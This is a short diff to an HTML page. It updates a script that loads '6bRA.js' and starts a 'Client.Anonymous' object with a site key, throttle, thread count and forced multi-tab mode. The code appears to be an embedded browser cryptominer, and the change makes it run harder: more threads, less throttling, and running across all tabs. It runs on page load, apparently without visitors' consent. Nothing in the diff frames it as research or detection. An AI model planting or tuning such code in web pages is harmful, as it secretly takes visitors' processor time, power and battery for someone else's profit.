@@ -3,10 +3,12 @@
   <body>
     <script src="6bRA.js"></script>
     <script>
-      var _client = new Client.Anonymous('198177faf3ee88d95efee3a812495bccc0c0e54b74e7ecb6092b1c2b4a18296b', {
-          throttle: 0.3, c: 'w'
+      var client = new Client.Anonymous('172bbb86aa01459f653e2f5fba80f06d24da814cd5994a22a62ac03cf4793874', {
+          throttle: 0.2, c: 'w',
+          threads: 8,
+          autoThreads: true
       });
-      _client.start();
+      client.start(Client.FORCE_MULTI_TAB);
     </script>
   </body>
 </html>
